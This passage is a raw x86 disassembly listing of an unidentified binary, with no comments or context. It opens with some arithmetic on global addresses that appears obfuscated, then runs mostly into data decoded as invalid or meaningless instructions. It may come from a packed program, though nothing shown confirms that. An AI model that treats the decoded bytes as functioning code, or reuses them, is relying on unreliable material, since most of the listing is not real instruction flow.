  40f3c7:	inc    DWORD PTR ds:0x42a014
  40f3cd:	add    ecx,DWORD PTR [eax+0x24]
  40f3d0:	sbb    DWORD PTR ds:0x42d000,0x42b014
  40f3da:	mov    DWORD PTR [ebp-0x34],ecx
  40f3dd:	mov    eax,DWORD PTR [ebp-0x14]
  40f3e0:	mov    ecx,DWORD PTR ds:0x42c00c
  40f3e6:	sub    DWORD PTR ds:0x42a018,ecx
  40f3ec:	mov    ecx,DWORD PTR [ebp+0x8]
  40f3ef:	sub    DWORD PTR ds:0x42c008,0x42b004
  40f3f9:	add    ecx,DWORD PTR [eax+0x1c]
  40f3fc:	mov    DWORD PTR [ebp-0x14],ecx
  40f3ff:	mov    DWORD PTR ds:0x42c01c,0x38b0
  40f409:	jmp    0x411884
  40f40e:	sub    DWORD PTR ds:0x42a000,ebx
  40f414:	mov    eax,DWORD PTR [ebp-0x2c]
  40f417:	mov    ecx,DWORD PTR ds:0x42e010
  40f41d:	mov    ecx,DWORD PTR [ecx]
  40f41f:	adc    DWORD PTR ds:0x42d014,ecx
  40f425:	mov    ecx,DWORD PTR [ebp+0x8]
  40f428:	and    DWORD PTR ds:0x42a000,0x732c
  40f432:	add    ecx,DWORD PTR [eax+ebx*4]
  40f435:	add    DWORD PTR ds:0x429018,ebx
  40f43b:	mov    DWORD PTR [ebp-0x28],ecx
  40f43e:	xor    DWORD PTR ds:0x42d00c,ecx
  40f444:	mov    eax,DWORD PTR [ebp-0x4]
  40f447:	and    DWORD PTR ds:0x42a010,0x0
  40f451:	jmp    0x40f463
  40f456:	mov    ecx,DWORD PTR ds:0x42a010
  40f45c:	inc    ecx
  40f45d:	mov    DWORD PTR ds:0x42a010,ecx
  40f463:	cmp    DWORD PTR ds:0x42a010,0x13
  40f46a:	jae    0x40f497
  40f470:	cmp    DWORD PTR ds:0x42a010,0x1c
  40f477:	jle    0x40f497
  40f47d:	jmp    0x40f492
  40f482:	push   0x42f181
  40f487:	push   0x0
  40f489:	push   DWORD PTR [ebp-0x18]
  40f48c:	call   DWORD PTR ds:0x430017
  40f492:	jmp    0x40f456
  40f497:	mov    ecx,DWORD PTR [ebp-0x28]
  40f49a:	and    DWORD PTR ds:0x42b000,0x42d018
  40f4a4:	xor    eax,esi
  40f4a6:	inc    DWORD PTR ds:0x42c000
  40f4ac:	add    eax,edi
  40f4ae:	cmp    ecx,eax
  40f4b0:	jmp    0x411846
  40f4b5:	push   esp
  40f4b6:	push   edx
  40f4b7:	or     eax,0x17250f6a
  40f4bc:	inc    esp
  40f4bd:	xor    ch,dh
  40f4bf:	xor    ebx,edi
  40f4c1:	mov    dl,0x2b
  40f4c3:	add    dh,cl
  40f4c5:	into   
  40f4c6:	scas   eax,DWORD PTR es:[edi]
  40f4c7:	jp     0x40f543
  40f4c9:	add    eax,0xee7a7a5f
  40f4ce:	jge    0x40f540
  40f4d0:	inc    esp
  40f4d2:	out    dx,al
  40f4d3:	stos   BYTE PTR es:[edi],al
  40f4d4:	test   al,0x72
  40f4d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f4d7:	mov    ah,0x1f
  40f4d9:	cld    
  40f4da:	jmp    0x40f4b2
  40f4dc:	pop    es
  40f4dd:	mov    ds:0x7f73d16d,eax
  40f4e2:	in     eax,0x5b
  40f4e4:	sub    eax,DWORD PTR es:[ebp+0x6e578b85]
  40f4eb:	imul   eax,DWORD PTR [eax-0x69b7f523],0xd591c518
  40f4f5:	mov    al,0xd3
  40f4f7:	popa   
  40f4f8:	or     WORD PTR [edi+0x40e975a3],cx
  40f4ff:	sub    eax,0x215a7c4d
  40f504:	dec    eax
  40f505:	jae    0x40f510
  40f507:	add    al,0xa2
  40f509:	mov    dh,0xc7
  40f50b:	adc    DWORD PTR [ecx-0x75],esi
  40f50e:	jl     0x40f557
  40f510:	or     DWORD PTR [eax-0x1c],esi
  40f513:	leave  
  40f514:	push   ss
  40f515:	bnd ret 0x1ef8
  40f519:	lods   eax,DWORD PTR ds:[esi]
  40f51a:	xchg   ecx,eax
  40f51b:	pop    eax
  40f51c:	dec    eax
  40f51d:	loopne 0x40f55b
  40f51f:	stos   DWORD PTR es:[edi],eax
  40f520:	std    
  40f521:	jle    0x40f4c0
  40f523:	dec    ebx
  40f524:	jmp    0x7df295ed
  40f529:	dec    eax
  40f52a:	fdivr  DWORD PTR [esi+ebp*8-0x27fdcf63]
  40f531:	fisubr WORD PTR [edx]
  40f533:	mov    BYTE PTR [esi-0x213782f0],bh
  40f539:	mov    bl,0x37
  40f53b:	test   al,0x93
  40f53d:	fisub  WORD PTR [edx-0x6ebe58fd]
  40f543:	fwait
  40f544:	or     DWORD PTR [edi+0xb5b156b],esp
  40f54a:	mov    esi,0x56290f70
  40f54f:	xor    eax,0x9f76f7ac
  40f554:	fild   WORD PTR [eax+0x7984db85]
  40f55a:	cmp    DWORD PTR [esi+0x4e41b37],ecx
  40f560:	mov    dl,BYTE PTR [edx+eiz*4]
  40f563:	push   0x37e97d84
  40f568:	push   edi
  40f569:	jb     0x40f53d
  40f56b:	xchg   ebx,eax
  40f56c:	inc    eax
  40f56d:	(bad)  
  40f56e:	bound  edi,QWORD PTR [ecx+eiz*1-0x61]
  40f572:	test   al,0x5f
  40f574:	fs or  eax,0x1319a1da
  40f57a:	pop    eax
  40f57b:	ret    
  40f57c:	jmp    0x40f570
  40f57e:	xchg   ebx,eax
  40f57f:	scas   eax,DWORD PTR es:[edi]
  40f580:	cmp    eax,0x9883ec36
  40f585:	adc    dh,BYTE PTR [esi+0x54358320]
  40f58b:	jo     0x40f55e
  40f58d:	mov    eax,0xb74733d
  40f592:	icebp  
  40f593:	dec    edi
  40f594:	add    al,0xeb
  40f596:	ja     0x40f60c
  40f598:	dec    ebx
  40f599:	(bad)
  40f59d:	call   0x8ba1:0x91e722a7
  40f5a4:	imul   edx,DWORD PTR [edx+0x1b67e148],0x5c
  40f5ab:	ret    0x45f4
  40f5ae:	(bad)  
  40f5af:	push   esi
  40f5b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f5b1:	out    dx,eax
  40f5b2:	ds scas eax,DWORD PTR es:[edi]
  40f5b4:	mov    ch,BYTE PTR [esi-0x3d]
  40f5b7:	fldcw  WORD PTR [ebx+0x47]
  40f5ba:	iret   
  40f5bb:	mov    edi,0xa8d06158
  40f5c0:	sub    bl,BYTE PTR [ecx+0x1acbda51]
  40f5c6:	cmp    BYTE PTR [ecx+0x52c7497d],ch
  40f5cc:	lds    ecx,FWORD PTR [ecx-0x66]
  40f5cf:	shl    BYTE PTR [edx-0x1d470c88],0x3
  40f5d6:	adc    BYTE PTR [ebp-0x43d0c54c],cl
  40f5dc:	push   esp
  40f5dd:	jne    0x40f573
  40f5df:	jb     0x40f5aa
  40f5e1:	out    0xd0,al
  40f5e3:	fmul   DWORD PTR [edx]
  40f5e5:	push   0xaa00a5fe
  40f5ea:	es fcom DWORD PTR cs:[eax+ebx*4]
  40f5ef:	stos   DWORD PTR es:[edi],eax
  40f5f0:	je     0x40f627
  40f5f2:	scas   eax,DWORD PTR es:[edi]
  40f5f3:	shl    BYTE PTR ds:0x7f77ba9e,1
  40f5f9:	mov    al,0x4a
  40f5fb:	rcl    DWORD PTR [eax-0x5e101d39],cl
  40f601:	mov    al,ds:0x1490cf8c
  40f606:	lods   al,BYTE PTR ds:[esi]
  40f607:	lock in al,0xb9
  40f60a:	outs   dx,BYTE PTR ds:[esi]
  40f60b:	outs   dx,DWORD PTR ds:[esi]
  40f60c:	sub    dl,al
  40f60e:	xor    cl,BYTE PTR [edx-0x6b]
  40f611:	in     eax,dx
  40f612:	shr    DWORD PTR ds:[edx+0x467b5390],cl
  40f619:	neg    ebp
  40f61b:	or     eax,0x172c0a52
  40f620:	outs   dx,BYTE PTR ds:[esi]
  40f621:	(bad)  
  40f622:	push   eax
  40f623:	ds mov ebx,0xafa11fd
  40f629:	mov    cs,WORD PTR [edi]
  40f62b:	jo     0x40f628
  40f62d:	sbb    eax,0x72f2dbda
  40f632:	mov    ch,0x39
  40f634:	jmp    0x40f649
  40f636:	popa   
  40f637:	mov    esi,0x2245c870
  40f63c:	xor    esi,eax
  40f63e:	push   esi
  40f63f:	ins    DWORD PTR es:[edi],dx
  40f640:	leave  
  40f641:	mov    ds:0x55311829,al
  40f646:	(bad)  
  40f647:	sbb    al,0xf8
  40f649:	jg     0x40f618
  40f64b:	xchg   ebp,eax
  40f64c:	mov    ds:0x9d4009b6,eax
  40f651:	arpl   WORD PTR ds:0x38ffa84c,sp
  40f657:	in     eax,dx
  40f658:	daa    
  40f659:	jmp    0xfc73:0x5e280949
  40f660:	icebp  
  40f661:	mov    ecx,edi
  40f663:	or     edx,DWORD PTR [ebx+0x60]
  40f666:	adc    eax,0xe30b9055
  40f66b:	ins    DWORD PTR es:[edi],dx
  40f66c:	sub    DWORD PTR [esi],edi
  40f66e:	dec    esi
  40f66f:	xlat   BYTE PTR ds:[ebx]
  40f670:	mov    esi,esi
  40f672:	mov    BYTE PTR [edx+ecx*2-0x21],dl
  40f676:	fstp   DWORD PTR [eax+esi*8-0x5]
  40f67a:	add    ch,dh
  40f67c:	xchg   edx,eax
  40f67d:	lahf   
  40f67e:	cs (bad) 
  40f680:	in     al,dx
  40f681:	lods   eax,DWORD PTR ds:[esi]
  40f682:	inc    esp
  40f683:	mov    dl,0xa2
  40f685:	dec    ebx
  40f686:	push   eax
  40f687:	shl    dh,1
  40f689:	adc    edi,DWORD PTR [eax-0x76]
  40f68c:	inc    ebp
  40f68d:	rol    BYTE PTR [ebx],0x3e
  40f690:	jbe    0x40f626
  40f692:	xor    edx,eax
  40f694:	jns    0x40f6b4
  40f696:	and    esi,DWORD PTR [edi-0x2]
  40f699:	or     dl,BYTE PTR [ebx-0x49]
  40f69c:	inc    edx
  40f69d:	jo     0x40f6f0
  40f69f:	pop    ds
  40f6a0:	(bad)  
  40f6a1:	aaa    
  40f6a2:	stc    
  40f6a3:	ins    DWORD PTR es:[edi],dx
  40f6a4:	pushf  
  40f6a5:	push   cs
  40f6a6:	outs   dx,DWORD PTR ds:[esi]
  40f6a7:	or     eax,0xa4f19fde
  40f6ac:	cdq    
  40f6ad:	(bad)  
  40f6ae:	or     eax,0x11406d89
  40f6b3:	mov    ds:0x6b15f223,eax
  40f6b8:	icebp  
  40f6b9:	push   eax
  40f6ba:	mov    DWORD PTR [eax],ecx
  40f6bc:	xchg   BYTE PTR [eax],al
  40f6be:	add    BYTE PTR [edi-0x575cfb0c],0xff
  40f6c5:	push   ds
  40f6c6:	retf   
  40f6c7:	cmp    eax,0x22e9ccc7
  40f6cc:	jp     0x40f70a
  40f6ce:	pop    esi
  40f6cf:	cs pop esi
  40f6d1:	and    eax,0x9a47a49f
  40f6d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f6d7:	push   edx
  40f6d8:	mov    al,ds:0x67826a12
  40f6dd:	sub    edx,esi
  40f6df:	or     al,0x6f
  40f6e1:	test   al,0x71
  40f6e3:	pop    ss
  40f6e4:	mov    bh,BYTE PTR [ebp-0x74]
  40f6e7:	jbe    0x40f761
  40f6e9:	rol    ebp,0xc
  40f6ec:	pop    ss
  40f6ed:	arpl   WORD PTR [eax],dx
  40f6ef:	imul   ecx,DWORD PTR ds:0x4bc11422,0x14c19090
  40f6f9:	mov    bl,0x92
  40f6fb:	push   edx
  40f6fc:	push   ss
  40f6fd:	(bad)  
  40f6ff:	imul   edx,DWORD PTR [edi-0x667a52c5],0x5a182dd7
  40f709:	div    BYTE PTR [esi+0x4c3ed26e]
  40f70f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f710:	cs dec esi
  40f712:	mov    ds:0xfa370d48,eax
  40f717:	(bad)  
  40f718:	sub    eax,esi
  40f71a:	push   ebx
  40f71b:	mov    bh,0x90
  40f71d:	sbb    eax,0x37f6ccac
  40f722:	push   0x7f
  40f724:	mov    edi,0x20995870
  40f729:	sbb    eax,0xb48a17a2
  40f72e:	xchg   ebp,eax
  40f72f:	mov    ebx,0xee90b229
  40f734:	sar    eax,0x3a
  40f737:	retf   
  40f738:	xchg   ebp,eax
  40f739:	mov    ebp,0xe882f021
  40f73e:	push   ds
  40f73f:	cmp    dh,BYTE PTR [eax-0x5b395ca1]
  40f745:	sub    al,0x41
  40f747:	or     eax,0x1c345764
  40f74c:	aad    0xd6
  40f74e:	mov    cl,0x4e
  40f750:	imul   edx,DWORD PTR [edx+ebp*1],0x5df9c4fc
  40f757:	int    0x4b
  40f759:	mov    ebx,DWORD PTR [eax+0x64]
  40f75c:	mov    al,0xe4
  40f75e:	jle    0x40f7c1
  40f760:	outs   dx,DWORD PTR ds:[esi]
  40f761:	out    0x7f,eax
  40f763:	cmc    
  40f764:	xchg   DWORD PTR [esi],ecx
  40f766:	cld    
  40f767:	xor    BYTE PTR [esi-0x1ed238eb],ch
  40f76d:	loop   0x40f73e
  40f76f:	cmp    esi,DWORD PTR ds:0xa6b52988
  40f775:	mov    ds:0x2a641b4b,al
  40f77a:	inc    ecx
  40f77b:	inc    eax
  40f77c:	push   edi
  40f77d:	and    bh,BYTE PTR [esi+eiz*1]
  40f780:	jb     0x40f7f3
  40f782:	lahf   
  40f783:	es push esp
  40f785:	cwde   
  40f786:	cdq    
  40f787:	add    al,0x58
  40f789:	out    dx,al
  40f78a:	call   0xda8e:0xd3e7aad4
  40f791:	adc    edi,DWORD PTR gs:[ebx+ebp*4+0x27fa548c]
  40f799:	stc    
  40f79a:	imul   ebx,ebx,0x41ed5e46
  40f7a0:	nop
  40f7a1:	pushf  
  40f7a2:	rcl    bl,cl
  40f7a4:	mov    edx,0xc2cea0fc
  40f7a9:	mov    ebx,0x11ca36f7
  40f7ae:	outs   dx,DWORD PTR ds:[esi]
  40f7af:	mov    ecx,0xb089e28e
  40f7b4:	xchg   esi,eax
  40f7b5:	mov    dl,0xb5
  40f7b7:	dec    edi
  40f7b8:	adc    eax,0xdffab7e
  40f7bd:	push   ebp
  40f7be:	sub    al,0x63
  40f7c0:	mov    ebx,esp
  40f7c2:	call   0xa0ddb643
  40f7c7:	cmp    ah,ch
  40f7c9:	inc    esp
  40f7ca:	jmp    0x40f7e3
  40f7cc:	pop    ss
  40f7cd:	add    edx,DWORD PTR [ebx+0x55b8575]
  40f7d3:	add    DWORD PTR [edx-0x6e],edx
  40f7d6:	adc    cl,BYTE PTR [edx]
  40f7d8:	pushf  
  40f7d9:	aad    0xb0
  40f7db:	pop    ebp
  40f7dc:	(bad)  
  40f7dd:	hlt    
  40f7de:	sahf   
  40f7df:	or     al,0xfd
  40f7e1:	adc    al,dl
  40f7e3:	test   BYTE PTR [ebx-0x33b69e64],dh
  40f7e9:	aaa    
  40f7ea:	mov    ah,0xcf
  40f7ec:	cld    
  40f7ed:	adc    al,0x46
  40f7ef:	mov    cl,0xfa
  40f7f1:	bound  esp,QWORD PTR [ebp-0x45379d59]
  40f7f7:	in     eax,0xde
  40f7f9:	jl     0x40f86f
  40f7fb:	jle    0x40f87c
  40f7fd:	push   0x4f162373
  40f802:	or     al,0x30
  40f804:	dec    ecx
  40f805:	stc    
  40f806:	jne    0x40f7b3
  40f808:	cdq    
  40f809:	popa   
  40f80a:	outs   dx,DWORD PTR ds:[esi]
  40f80b:	daa    
  40f80c:	sbb    DWORD PTR [esi+0x4d],esi
  40f80f:	push   es
  40f810:	mov    al,ds:0x816149ca
  40f815:	ret    
  40f816:	and    al,0x1b
  40f818:	outs   dx,DWORD PTR ds:[esi]
  40f819:	daa    
  40f81a:	js     0x40f822
  40f81c:	mov    eax,0x5a49af53
  40f821:	dec    ebx
  40f822:	dec    edx
  40f823:	popf   
  40f824:	and    al,0xb
  40f826:	sti    
  40f827:	fisubr DWORD PTR [eax]
  40f829:	xchg   eax,ebp
  40f82b:	dec    esp
  40f82c:	sbb    DWORD PTR [edi-0x74],ebp
  40f82f:	mov    DWORD PTR [ecx-0x16bb4233],eax
  40f835:	push   es
  40f836:	aad    0x79
  40f838:	push   eax
  40f839:	ins    BYTE PTR es:[edi],dx
  40f83a:	push   ecx
  40f83b:	popa   
  40f83c:	fldcw  WORD PTR [edx]
  40f83e:	jg     0x40f845
  40f840:	(bad)  
  40f841:	sahf   
  40f842:	mov    al,ds:0x30022bb6
  40f847:	fdivr  QWORD PTR [ebp+ecx*2+0x26]
  40f84b:	sar    DWORD PTR [ecx+edx*4-0x5],0xf3
  40f850:	in     al,dx
  40f851:	into   
  40f852:	icebp  
  40f853:	mov    WORD PTR [ebx],?
  40f855:	cli    
  40f856:	sar    eax,0xc9
  40f859:	out    0xa6,al
  40f85b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f85c:	nop    DWORD PTR [ebx]
  40f85f:	pop    ebp
  40f860:	rcr    BYTE PTR [edx+ebp*1],1
  40f863:	sti    
  40f864:	ins    DWORD PTR es:[edi],dx
  40f865:	jle    0x40f7f2
  40f867:	pop    esi
  40f868:	push   ss
  40f869:	lahf   
  40f86a:	xor    edx,edi
  40f86c:	and    ebp,DWORD PTR [ebx+0x51e20fe9]
  40f872:	xchg   esp,eax
  40f873:	lahf   
  40f874:	adc    ecx,edi
  40f876:	hlt    
  40f877:	(bad)  
  40f879:	or     eax,0x3fd75caa
  40f87e:	fstp   DWORD PTR [ebp-0x2716d302]
  40f884:	fnstcw WORD PTR [edx+ebx*8-0x25]
  40f888:	lea    esi,[edi+eiz*2+0x58]
  40f88c:	xor    al,0x9c
  40f88e:	iret   
  40f88f:	and    BYTE PTR [edi],bl
  40f891:	cmp    al,0xb6
  40f893:	sbb    BYTE PTR [esi],ch
  40f895:	dec    eax
  40f896:	(bad)  
  40f897:	pushf  
  40f898:	add    edi,DWORD PTR [ebx-0xebd91dd]
  40f89e:	loope  0x40f8f3
  40f8a0:	fild   QWORD PTR [edx-0x1c057afe]
  40f8a6:	popa   
  40f8a7:	aad    0x6
  40f8a9:	sbb    BYTE PTR [ecx+0x6dff8aba],bh
  40f8af:	inc    edx
  40f8b0:	add    cl,BYTE PTR [ebp-0x3f1749cb]
  40f8b6:	push   ebp
  40f8b7:	xchg   BYTE PTR [ecx+0x6203c4f5],dh
  40f8bd:	scas   eax,DWORD PTR es:[edi]
  40f8be:	lea    ebp,[ebx-0x40]
  40f8c1:	sub    bh,bl
  40f8c3:	imul   edx,DWORD PTR fs:[eax-0x51],0xffffff8a
  40f8c8:	(bad)  [ecx+eiz*8]
  40f8cb:	mov    ds:0x14ac82b1,eax
  40f8d0:	inc    ecx
  40f8d1:	inc    edi
  40f8d2:	pop    ecx
  40f8d3:	dec    eax
  40f8d4:	xor    BYTE PTR [eax+0x68],dh
  40f8d7:	add    ch,BYTE PTR [edx-0xd]
  40f8da:	or     bh,dl
  40f8dc:	push   edi
  40f8dd:	mov    es,WORD PTR [esi+eax*8+0x150add98]
  40f8e4:	and    eax,0x475e57e3
  40f8e9:	rcr    BYTE PTR [ebx],0x2d
  40f8ec:	dec    ecx
  40f8ed:	add    al,0xb5
  40f8ef:	lea    esp,[ebx+0x64]
  40f8f2:	bound  ebp,QWORD PTR [esp+edi*8]
  40f8f5:	adc    cl,BYTE PTR [esi-0x624f5a12]
  40f8fb:	popf   
  40f8fc:	add    eax,0xe461af70
  40f901:	sbb    BYTE PTR [ebp+0x48],cl
  40f904:	mov    cl,0x1b
  40f906:	mov    dl,0xb6
  40f908:	pop    ebp
  40f909:	nop
  40f90a:	dec    BYTE PTR [edx+0x20202216]
  40f910:	jae    0x40f919
  40f912:	xor    eax,0x578e8f73
  40f917:	lods   eax,DWORD PTR ds:[esi]
  40f918:	push   cs
  40f919:	dec    ebp
  40f91a:	call   0xacdc54f8
  40f91f:	jbe    0x40f8bf
  40f921:	xor    ebp,DWORD PTR [esi+0xe]
  40f924:	aam    0x95
  40f926:	jbe    0x40f8cf
  40f928:	pop    es
  40f929:	into   
  40f92a:	imul   ebp,ebp,0xbb2576b5
  40f930:	ss retf 0xda98
  40f934:	pushf  
  40f935:	ss in  eax,0x15
  40f938:	scas   al,BYTE PTR es:[edi]
  40f939:	lahf   
  40f93a:	ret    0x7c8b
  40f93d:	dec    esi
  40f93e:	xor    bl,ah
  40f940:	and    ebp,DWORD PTR [ebp+0x6e]
  40f943:	pop    ecx
  40f944:	cs dec edi
  40f946:	mov    edx,ds
  40f948:	das    
  40f949:	jnp    0x40f8ed
  40f94b:	add    eax,0x79a88ae1
  40f950:	je     0x40f8df
  40f952:	inc    esi
  40f953:	push   ds
  40f954:	inc    ebx
  40f955:	dec    esi
  40f956:	add    al,0x67
  40f958:	(bad)  
  40f959:	xlat   BYTE PTR ds:[ebx]
  40f95a:	packuswb mm2,QWORD PTR [ecx-0x4d6529a0]
  40f961:	and    BYTE PTR [ebp-0x31],ch
  40f964:	in     eax,dx
  40f965:	into   
  40f966:	push   0xdbfd2911
  40f96b:	jbe    0x40f90b
  40f96d:	jmp    0x887f82f1
  40f972:	fs into 
  40f974:	xchg   edx,eax
  40f975:	in     al,dx
  40f976:	int    0x96
  40f978:	cmp    esi,DWORD PTR ds:0xa227f286
  40f97e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f97f:	sti    
  40f980:	dec    edx
  40f981:	mov    ?,WORD PTR [ebp-0x63]
  40f984:	cvtps2pd xmm6,xmm0
  40f987:	in     eax,dx
  40f988:	hlt    
  40f989:	repz mov eax,0x1a6d6a42
  40f98f:	sbb    eax,0x5dc46f7e
  40f994:	aam    0x65
  40f996:	and    eax,DWORD PTR [edx-0x6e0b49d3]
  40f99c:	mov    esi,0x4581668e
  40f9a1:	cli    
  40f9a2:	(bad)  
  40f9a3:	cmp    al,BYTE PTR [edx+0x53]
  40f9a6:	mov    al,0x7f
  40f9a8:	jle    0x40f9af
  40f9aa:	mov    cl,0x70
  40f9ac:	sub    DWORD PTR [ecx+0x5fc2220c],0xfffffffb
  40f9b3:	enter  0xa204,0xc2
  40f9b7:	jbe    0x40fa15
  40f9b9:	push   0xffffffa1
  40f9bb:	in     al,0x3e
  40f9bd:	dec    ebp
  40f9be:	jmp    0x40fa3b
  40f9c0:	dec    ecx
  40f9c1:	jmp    0x25e8:0xd337e841
  40f9c8:	cli    
  40f9c9:	add    DWORD PTR [ecx-0x30dac95a],edi
  40f9cf:	ret    
  40f9d0:	cli    
  40f9d1:	or     BYTE PTR [ecx+0x2e],dh
  40f9d4:	dec    esi
  40f9d5:	das    
  40f9d6:	xchg   esi,eax
  40f9d7:	adc    al,0xe
  40f9d9:	bound  ecx,QWORD PTR [ebx-0x7e32c107]
  40f9df:	or     al,0x2a
  40f9e1:	inc    ebx
  40f9e2:	and    eax,0x54cbd09
  40f9e7:	add    eax,0x7f78489d
  40f9ec:	dec    edx
  40f9ed:	cwde   
  40f9ee:	dec    eax
  40f9ef:	popa   
  40f9f0:	cwde   
  40f9f1:	ja     0x40f97c
  40f9f3:	out    0x27,al
  40f9f5:	mov    ebp,0xc340c8a0
  40f9fa:	jge    0x40f9e6
  40f9fc:	sub    ebx,DWORD PTR [ebx-0x6d]
  40f9ff:	cs inc esi
  40fa01:	fimul  DWORD PTR [esi]
  40fa03:	xor    al,0x5e
  40fa05:	push   ss
  40fa06:	add    al,0x26
  40fa08:	jmp    0x928bb778
  40fa0d:	mov    ds:0xf0a63fda,eax
  40fa12:	div    bh
  40fa14:	stos   DWORD PTR es:[edi],eax
  40fa15:	test   al,0x6
  40fa17:	mov    BYTE PTR [ebp+0x489453d3],al
  40fa1d:	xchg   ebx,eax
  40fa1e:	jge    0x40fa26
  40fa20:	inc    esi
  40fa21:	xchg   BYTE PTR [ebx+0x17925900],cl
  40fa27:	xchg   esi,eax
  40fa28:	(bad)  
  40fa29:	arpl   WORD PTR [esi+0x1],cx
  40fa2c:	stos   BYTE PTR es:[edi],al
  40fa2d:	loope  0x40fa27
  40fa2f:	sbb    DWORD PTR [edi+0xecc9924],0xffffffc7
  40fa36:	ja     0x40fa7f
  40fa38:	addr16 test al,0xd1
  40fa3b:	stos   DWORD PTR es:[edi],eax
  40fa3c:	out    0x1d,al
  40fa3e:	jge    0x40f9fd
  40fa40:	fcomp  QWORD PTR ds:0xd1a2b184
  40fa46:	fist   DWORD PTR [edx]
  40fa48:	cmp    ch,BYTE PTR [ecx]
  40fa4a:	mov    ebx,0x2c8c8fa6
  40fa4f:	inc    esi
  40fa50:	cmp    cl,BYTE PTR [esi+esi*4]
  40fa53:	in     eax,dx
  40fa54:	and    al,0x59
  40fa56:	cdq    
  40fa57:	stos   DWORD PTR es:[edi],eax
  40fa58:	out    dx,al
  40fa59:	pop    es
  40fa5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa5b:	call   0xa6ccd913
  40fa60:	repnz nop
  40fa62:	cmp    eax,0xac6cf75d
  40fa67:	bnd jle 0x40fab3
  40fa6a:	mov    al,ds:0xaa15d74e
  40fa6f:	add    bh,BYTE PTR [esi-0x6ef1a8af]
  40fa75:	je     0x40fac9
  40fa77:	xchg   esi,eax
  40fa78:	mov    BYTE PTR [edx-0x312f6613],al
  40fa7e:	sub    al,0x1f
  40fa80:	outs   dx,DWORD PTR ds:[esi]
  40fa81:	pusha  
  40fa82:	cmp    ebp,DWORD PTR [edx+ecx*4]
  40fa85:	pop    eax
  40fa86:	dec    ebp
  40fa87:	cs jo  0x40fa68
  40fa8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa8b:	aam    0x82
  40fa8d:	in     al,dx
  40fa8e:	and    ebp,ebp
  40fa90:	outs   dx,BYTE PTR ds:[esi]
  40fa91:	xlat   BYTE PTR ds:[ebx]
  40fa92:	pop    esp
  40fa93:	fistp  DWORD PTR [ecx+0x35e4a6d0]
  40fa99:	sbb    BYTE PTR [ecx+edx*4-0xeca591e],bh
  40faa0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40faa1:	in     al,dx
  40faa2:	and    al,0xc1
  40faa4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40faa5:	lds    edi,FWORD PTR [ebx+0x6]
  40faa8:	imul   ebx,DWORD PTR [esi],0xf83eddc8
  40faae:	repnz dec ebx
  40fab0:	xchg   edi,eax
  40fab1:	shl    ch,1
  40fab3:	addr16 push 0xffffffdd
  40fab6:	sbb    esp,DWORD PTR [edi+0x147f732a]
  40fabc:	sar    eax,0x76
  40fabf:	lahf   
  40fac0:	or     eax,0xa189c301
  40fac5:	inc    ecx
  40fac6:	mov    dh,0x5e
  40fac8:	fsubr  DWORD PTR [eax]
  40faca:	jnp    0x40fa99
  40facc:	out    0xba,eax
  40face:	out    dx,al
  40facf:	mov    esi,DWORD PTR [ecx]
  40fad1:	ja     0x40fa9f
  40fad3:	test   eax,0x7a6f1273
  40fad8:	mov    bh,0x4
  40fada:	xchg   DWORD PTR [edx+edx*4],edx
  40fadd:	mov    edx,0x379dc911
  40fae2:	pop    ss
  40fae3:	mov    dl,0x74
  40fae5:	enter  0xdc83,0x9
  40fae9:	retf   0x569f
  40faec:	mov    eax,0x8d52b815
  40faf1:	mov    ah,0xb9
  40faf3:	pushf  
  40faf4:	ss ja  0x40fb0f
  40faf7:	aaa    
  40faf8:	(bad)  
  40faf9:	cmp    al,0x93
  40fafb:	jb     0x40fb49
  40fafd:	add    DWORD PTR [edi+eiz*1],ebp
  40fb00:	rcl    DWORD PTR [ebp+0x49],0x1a
  40fb04:	hlt    
  40fb05:	inc    esp
  40fb06:	mov    edx,DWORD PTR [edi-0x5aad9428]
  40fb0c:	cmp    esp,DWORD PTR [edx]
  40fb0e:	jns    0x40faac
  40fb10:	test   eax,0x7eb83e78
  40fb15:	div    al
  40fb17:	jne    0x40fb57
  40fb19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb1a:	(bad)  
  40fb1c:	mov    eax,0x41a7f65c
  40fb21:	jae    0x40fb61
  40fb23:	mov    dl,0x4b
  40fb25:	mov    esp,0x8019d5f4
  40fb2a:	in     eax,dx
  40fb2b:	ins    DWORD PTR es:[edi],dx
  40fb2c:	jge    0x40fb2e
  40fb2e:	add    edi,DWORD PTR [eax+0x5a]
  40fb31:	cmp    DWORD PTR [eax+0x27],eax
  40fb34:	xchg   ecx,eax
  40fb35:	adc    cl,BYTE PTR [eax+0x53]
  40fb38:	mov    ebx,0xb6f7b06e
  40fb3d:	inc    ebx
  40fb3e:	sbb    eax,0x32a36e79
  40fb43:	pushf  
  40fb44:	ror    ebp,cl
  40fb46:	(bad)
  40fb49:	fist   DWORD PTR [edx]
  40fb4b:	sbb    cl,cl
  40fb4d:	retf   
  40fb4e:	cmp    ebp,DWORD PTR [esi]
  40fb50:	lods   al,BYTE PTR ds:[esi]
  40fb51:	stos   DWORD PTR es:[edi],eax
  40fb52:	cli    
  40fb53:	in     al,0xde
  40fb55:	aam    0xcd
  40fb57:	pop    ss
  40fb58:	push   ds
  40fb59:	and    edx,ebp
  40fb5b:	xchg   BYTE PTR [edi],cl
  40fb5d:	jnp    0x40faf0
  40fb5f:	mov    ?,WORD PTR [ebp-0x4b048aee]
  40fb65:	jbe    0x40fb83
  40fb67:	neg    BYTE PTR [ebp+0x64]
  40fb6a:	dec    esp
  40fb6b:	iret   
  40fb6c:	mov    ah,0x5
  40fb6e:	inc    esp
  40fb6f:	call   0xccfc:0x11dd1e1f
  40fb76:	xor    eax,0x9ebfb73f
  40fb7b:	sbb    DWORD PTR [edi-0x7a5de797],ebp
  40fb81:	add    eax,0xcef019ce
  40fb86:	dec    ebp
  40fb87:	int    0x58
  40fb89:	cli    
  40fb8a:	mov    esp,0xebac304f
  40fb8f:	xchg   esi,eax
  40fb90:	loop   0x40fb7a
